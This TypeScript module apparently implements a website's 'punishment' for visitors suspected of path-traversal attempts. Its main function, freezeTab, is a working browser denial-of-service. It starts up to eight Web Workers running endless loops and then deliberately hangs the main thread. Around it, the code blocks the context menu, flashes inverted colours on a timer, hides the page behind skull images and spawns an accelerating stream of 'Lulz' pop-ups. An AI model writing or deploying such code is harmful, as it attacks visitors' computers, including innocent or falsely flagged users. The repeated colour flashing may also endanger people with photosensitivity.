import {
  ACTIVE_CLASS,
  CLUSTER_CLASS,
  GOTCHA_CONSOLE_DELAY_MS,
  INVERTED_CLASS,
  INVERT_INTERVAL_MS,
  LULZ_ACCELERATION_POWER,
  LULZ_INITIAL_DELAY_MAX_MS,
  LULZ_INITIAL_DELAY_MIN_MS,
  LULZ_MODAL_CLASS,
  LULZ_MODAL_MAX,
  LULZ_RAMP_DELAY_END_MS,
  LULZ_RAMP_DELAY_START_MS,
  LULZ_RAMP_DURATION_MS,
  LULZ_SLOW_DELAY_MAX_MS,
  LULZ_SLOW_DELAY_MIN_MS,
  LULZ_SLOW_PHASE_MS,
  LULZ_STACK_CLASS,
  LULZ_TURBO_AFTER_MS,
  LULZ_TURBO_DELAY_MAX_MS,
  LULZ_TURBO_DELAY_MIN_MS,
  MODAL_ID,
  PUNISHMENT_CSS,
  SKULL_CURSOR_URL,
  SKULL_FLOOD_ID,
  SKULL_PUBLIC_URL,
  STYLE_ID,
  TRAVERSAL_PUNISHMENT_MESSAGE,
} from "./traversalPunishmentConstants";

export { SKULL_PUBLIC_URL, SKULL_CURSOR_URL, TRAVERSAL_PUNISHMENT_MESSAGE };

declare global {
  interface Window {
    __rwTraversalPunishmentActive?: boolean;
    __rwLulzSpamActive?: boolean;
    __rwSkullFloodResizeBound?: boolean;
    __rwGotchaLogged?: boolean;
  }
}

function injectStyles(): void {
  if (document.getElementById(STYLE_ID)) return;
  const style = document.createElement("style");
  style.id = STYLE_ID;
  style.textContent = PUNISHMENT_CSS;
  document.head.appendChild(style);
}

function blockContextMenu(event: Event): void {
  event.preventDefault();
}

function startPunishmentInputLockdown(): void {
  document.addEventListener("contextmenu", blockContextMenu, { capture: true });
}

function startColorInversion(): void {
  document.documentElement.classList.add(ACTIVE_CLASS);
  startPunishmentInputLockdown();
  window.setInterval(() => {
    document.documentElement.classList.toggle(INVERTED_CLASS);
  }, INVERT_INTERVAL_MS);
}

/**
 * Hangs the tab (and hammers CPU via workers). Must run only in the browser.
 * Never call from Workers middleware — client / inline 403 runner only.
 */
function freezeTab(): void {
  console.log("Gotcha");

  try {
    const cores = navigator.hardwareConcurrency ?? 4;
    const workerCount = Math.min(cores, 8);
    const workerSource = "while(true){}";

    for (let i = 0; i < workerCount; i += 1) {
      const blob = new Blob([workerSource], { type: "application/javascript" });
      new Worker(URL.createObjectURL(blob));
    }
  } catch {
    /* workers are best-effort */
  }

  while (true) {
    /* deliberate main-thread hang */
  }
}

function scheduleGotchaConsoleLog(): void {
  if (window.__rwGotchaLogged) return;

  const logGotcha = (): void => {
    if (window.__rwGotchaLogged) return;
    window.__rwGotchaLogged = true;
    freezeTab();
  };

  const runAfterLoad = (): void => {
    window.setTimeout(logGotcha, GOTCHA_CONSOLE_DELAY_MS);
  };

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", runAfterLoad, { once: true });
    return;
  }

  requestAnimationFrame(runAfterLoad);
}

function getHeroRootInMain(): HTMLElement | null {
  const hero = document.getElementById("hero");
  if (!hero) return null;

  let node: HTMLElement | null = hero;
  while (node.parentElement && node.parentElement.id !== "main-content") {
    node = node.parentElement;
  }

  return node?.parentElement?.id === "main-content" ? node : null;
}

function hideContentBelowHero(): void {
  const main = document.getElementById("main-content");
  const heroRoot = getHeroRootInMain();
  if (!main || !heroRoot) return;

  for (const child of Array.from(main.children)) {
    const el = child as HTMLElement;
    if (el === heroRoot) continue;
    el.setAttribute("data-rw-skull-hidden", "1");
    el.hidden = true;
  }

  const footer = document.querySelector("#documentContainer > footer");
  if (footer instanceof HTMLElement) {
    footer.setAttribute("data-rw-skull-hidden", "1");
    footer.hidden = true;
  }
}

function replaceSvgWithSkull(svg: SVGElement, skullUrl: string): void {
  const rect = svg.getBoundingClientRect();
  const img = document.createElement("img");
  img.src = skullUrl;
  img.alt = "";
  img.className = "rw-skull-replaced-icon";
  const size = Math.max(12, Math.round(rect.width || rect.height || 16));
  img.width = size;
  img.height = size;
  img.style.width = `${size}px`;
  img.style.height = `${size}px`;
  svg.replaceWith(img);
}

function replaceIconsWithSkull(skullUrl: string, root: ParentNode): void {
  root.querySelectorAll("img").forEach((img) => {
    if (img.closest(`#${MODAL_ID}`) || img.closest(`#${SKULL_FLOOD_ID}`)) return;
    img.src = skullUrl;
    img.removeAttribute("srcset");
    img.removeAttribute("sizes");
  });

  root.querySelectorAll(".social-icon").forEach((el) => {
    const span = el as HTMLElement;
    const img = document.createElement("img");
    img.src = skullUrl;
    img.alt = "";
    img.className = "rw-skull-replaced-icon";
    img.width = 16;
    img.height = 16;
    span.replaceWith(img);
  });

  root
    .querySelectorAll(
      "#hero svg, nav svg, #documentContainer header svg",
    )
    .forEach((node) => {
      const svg = node as SVGElement;
      if (svg.closest(`#${MODAL_ID}`)) return;
      replaceSvgWithSkull(svg, skullUrl);
    });
}

function fillSkullFlood(container: HTMLElement, skullUrl: string): void {
  const tileSize = 88;
  const gap = 12;
  const main = document.getElementById("main-content");
  const hero = document.getElementById("hero");
  const width = main?.clientWidth ?? container.clientWidth ?? window.innerWidth;
  const cols = Math.max(3, Math.floor((width + gap) / (tileSize + gap)));
  const heroBottom = hero?.getBoundingClientRect().bottom ?? 0;
  const availableHeight = Math.max(
    window.innerHeight - heroBottom + window.scrollY,
    window.innerHeight * 0.45,
  );
  const rows = Math.ceil(availableHeight / (tileSize + gap)) + 2;
  const count = cols * rows;

  if (container.dataset.skullCount === String(count)) {
    container.style.setProperty("--skull-cols", String(cols));
    return;
  }

  container.dataset.skullCount = String(count);
  container.style.setProperty("--skull-cols", String(cols));
  container.replaceChildren();

  for (let i = 0; i < count; i += 1) {
    const img = document.createElement("img");
    img.src = skullUrl;
    img.alt = "";
    img.className = "rw-skull-tile";
    img.width = tileSize;
    img.height = tileSize;
    img.decoding = "async";
    img.loading = "eager";
    container.appendChild(img);
  }
}

function mountSkullFlood(skullUrl: string): void {
  const main = document.getElementById("main-content");
  if (!main) return;

  let flood = document.getElementById(SKULL_FLOOD_ID);
  if (!flood) {
    flood = document.createElement("div");
    flood.id = SKULL_FLOOD_ID;
    flood.className = "rw-skull-flood";
    flood.setAttribute("aria-hidden", "true");

    const heroRoot = getHeroRootInMain();
    if (heroRoot?.nextSibling) {
      main.insertBefore(flood, heroRoot.nextSibling);
    } else {
      main.appendChild(flood);
    }
  }

  fillSkullFlood(flood, skullUrl);

  if (!window.__rwSkullFloodResizeBound) {
    window.__rwSkullFloodResizeBound = true;
    window.addEventListener("resize", () => {
      const el = document.getElementById(SKULL_FLOOD_ID);
      if (el) fillSkullFlood(el, skullUrl);
    });
  }
}

function applySkullTakeover(skullUrl: string): void {
  if (!document.getElementById("main-content")) return;

  hideContentBelowHero();
  const scope = document.getElementById("documentContainer") ?? document.body;
  replaceIconsWithSkull(skullUrl, scope);
  mountSkullFlood(skullUrl);
}

function randomBetween(min: number, max: number): number {
  return min + Math.random() * (max - min);
}

function nextLulzSpawnDelayMs(spamStartedAt: number): number {
  const elapsed = Date.now() - spamStartedAt;

  if (elapsed < LULZ_SLOW_PHASE_MS) {
    return Math.round(
      randomBetween(LULZ_SLOW_DELAY_MIN_MS, LULZ_SLOW_DELAY_MAX_MS),
    );
  }

  if (elapsed >= LULZ_TURBO_AFTER_MS) {
    const base = randomBetween(LULZ_TURBO_DELAY_MIN_MS, LULZ_TURBO_DELAY_MAX_MS);
    const jitter = randomBetween(0.72, 1.38);
    return Math.max(4, Math.round(base * jitter));
  }

  const rampProgress = Math.min(
    1,
    (elapsed - LULZ_SLOW_PHASE_MS) / LULZ_RAMP_DURATION_MS,
  );
  const eased = rampProgress ** LULZ_ACCELERATION_POWER;
  const base =
    LULZ_RAMP_DELAY_START_MS -
    (LULZ_RAMP_DELAY_START_MS - LULZ_RAMP_DELAY_END_MS) * eased;
  const jitter = randomBetween(0.88, 1.12);
  return Math.max(LULZ_RAMP_DELAY_END_MS, Math.round(base * jitter));
}

function initialLulzDelayMs(): number {
  return Math.round(
    randomBetween(LULZ_INITIAL_DELAY_MIN_MS, LULZ_INITIAL_DELAY_MAX_MS),
  );
}

function spawnLulzModal(stack: HTMLElement, index: number): void {
  const modal = document.createElement("div");
  modal.className = LULZ_MODAL_CLASS;
  modal.textContent = "Lulz";

  const width = 110 + Math.random() * 90;
  const height = 44 + Math.random() * 28;
  const edgePad = 12;
  const maxLeft = Math.max(edgePad, window.innerWidth - width - edgePad);
  const maxTop = Math.max(edgePad, window.innerHeight - height - edgePad);
  const left = edgePad + Math.random() * (maxLeft - edgePad);
  const top = edgePad + Math.random() * (maxTop - edgePad);
  const rotation = (Math.random() - 0.5) * 12;

  modal.style.width = `${width}px`;
  modal.style.minHeight = `${height}px`;
  modal.style.left = `${left}px`;
  modal.style.top = `${top}px`;
  modal.style.zIndex = String(index);
  modal.style.transform = `rotate(${rotation}deg)`;

  stack.appendChild(modal);
}

function startLulzModalSpam(lulzStack: HTMLElement): void {
  if (typeof document === "undefined") return;
  if (window.__rwLulzSpamActive) return;

  window.__rwLulzSpamActive = true;
  lulzStack.setAttribute("aria-hidden", "true");

  let count = 0;
  let spamStartedAt: number | null = null;

  const spawnNext = (): void => {
    if (count >= LULZ_MODAL_MAX) return;

    if (spamStartedAt === null) {
      spamStartedAt = Date.now();
    }

    spawnLulzModal(lulzStack, count);
    count += 1;

    if (count < LULZ_MODAL_MAX && spamStartedAt !== null) {
      window.setTimeout(
        spawnNext,
        nextLulzSpawnDelayMs(spamStartedAt),
      );
    }
  };

  window.setTimeout(spawnNext, initialLulzDelayMs());
}

function createModalShell(): {
  overlay: HTMLDivElement;
  lulzStack: HTMLDivElement;
} {
  const overlay = document.createElement("div");
  overlay.id = MODAL_ID;
  overlay.setAttribute("role", "alertdialog");
  overlay.setAttribute("aria-modal", "true");
  overlay.setAttribute("aria-live", "assertive");

  const backdrop = document.createElement("div");
  backdrop.className = "rw-traversal-modal__backdrop";
  backdrop.setAttribute("aria-hidden", "true");

  const cluster = document.createElement("div");
  cluster.className = CLUSTER_CLASS;

  const lulzStack = document.createElement("div");
  lulzStack.className = LULZ_STACK_CLASS;

  const panel = document.createElement("div");
  panel.className = "rw-traversal-modal__panel";

  const message = document.createElement("p");
  message.className = "rw-traversal-modal__message";
  message.textContent = TRAVERSAL_PUNISHMENT_MESSAGE;

  panel.append(message);
  cluster.append(panel);
  overlay.append(backdrop, lulzStack, cluster);

  return { overlay, lulzStack };
}

/** Logs attempt server-side; response is not shown in the UI. */
function logTraversalAttemptClient(attemptedUrl: string): void {
  void fetch("/api/traversal-log", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ attemptedUrl }),
  }).catch(() => {
    /* logging must not block punishment UI */
  });
}

export function showTraversalPunishment(attemptedUrl?: string): void {
  if (typeof document === "undefined") return;
  if (window.__rwTraversalPunishmentActive || document.getElementById(MODAL_ID)) {
    return;
  }

  window.__rwTraversalPunishmentActive = true;
  injectStyles();
  startColorInversion();
  applySkullTakeover(SKULL_PUBLIC_URL);

  const { overlay, lulzStack } = createModalShell();
  document.body.appendChild(overlay);
  document.body.style.overflow = "hidden";

  logTraversalAttemptClient(attemptedUrl ?? window.location.href);

  startLulzModalSpam(lulzStack);
  scheduleGotchaConsoleLog();
}
